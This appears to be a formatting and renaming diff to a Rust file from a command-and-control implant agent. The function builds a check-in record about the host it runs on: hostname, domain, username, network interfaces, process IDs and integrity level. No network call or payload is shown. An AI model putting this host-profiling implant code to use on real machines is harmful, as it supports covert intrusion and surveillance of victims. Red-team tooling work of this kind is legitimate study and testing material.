@@ -1,22 +1,17 @@
 use core::ffi::c_void;
-use libc_print::libc_println;
 
-use mod_agentcore::instance_mut;
-
-use mod_win32::{
-    nt_get_adapters_info::get_adapters_info,
-    nt_get_computer_name_ex::{get_computer_name_ex, ComputerNameFormat},
-    nt_peb::{
-        get_image_path_name, get_os, get_os_version_info, get_process_name, get_user_domain,
-        get_username,
-    },
-    nt_ps_api::{get_pid_and_ppid, get_process_integrity},
-};
-
-use rs2_communication_protocol::{
+use kageshirei_communication_protocol::{
     communication_structs::checkin::{Checkin, PartialCheckin},
     metadata::Metadata,
     network_interface::NetworkInterface,
+};
+use libc_print::libc_println;
+use mod_agentcore::instance_mut;
+use mod_win32::{
+    nt_get_adapters_info::get_adapters_info,
+    nt_get_computer_name_ex::{get_computer_name_ex, ComputerNameFormat},
+    nt_peb::{get_image_path_name, get_os, get_os_version_info, get_process_name, get_user_domain, get_username},
+    nt_ps_api::{get_pid_and_ppid, get_process_integrity},
 };
 
 use crate::common::utils::generate_request_id;
@@ -39,7 +34,8 @@ pub fn initialize_system_data() {
             hostname = String::from_utf16_lossy(&buffer)
                 .trim_end_matches('\0')
                 .to_string();
-        } else {
+        }
+        else {
             libc_println!("[!] get_computer_name_ex failed");
         }
 
@@ -76,10 +72,10 @@ pub fn initialize_system_data() {
         // Create a Checkin object with the gathered metadata
         let mut checkin = Box::new(Checkin::new(PartialCheckin {
             operative_system: operating_system,
-            hostname: hostname,
+            hostname,
             domain: get_user_domain(),
             username: get_username(),
-            network_interfaces: network_interfaces,
+            network_interfaces,
             process_id: pid as i64,
             parent_process_id: ppid as i64,
             process_name: get_process_name(),
@@ -91,8 +87,8 @@ pub fn initialize_system_data() {
         let metadata = Metadata {
             request_id: generate_request_id(32),
             command_id: generate_request_id(32),
-            agent_id: generate_request_id(32),
-            path: None,
+            agent_id:   generate_request_id(32),
+            path:       None,
         };
 
         checkin.with_metadata(metadata);
@@ -103,6 +99,4 @@ pub fn initialize_system_data() {
 }
 
 /// Function to retrieve a mutable reference to a Checkin struct from a raw pointer.
-pub unsafe fn checkin_from_raw(ptr: *mut c_void) -> &'static mut Checkin {
-    &mut *(ptr as *mut Checkin)
-}
+pub unsafe fn checkin_from_raw(ptr: *mut c_void) -> &'static mut Checkin { &mut *(ptr as *mut Checkin) }
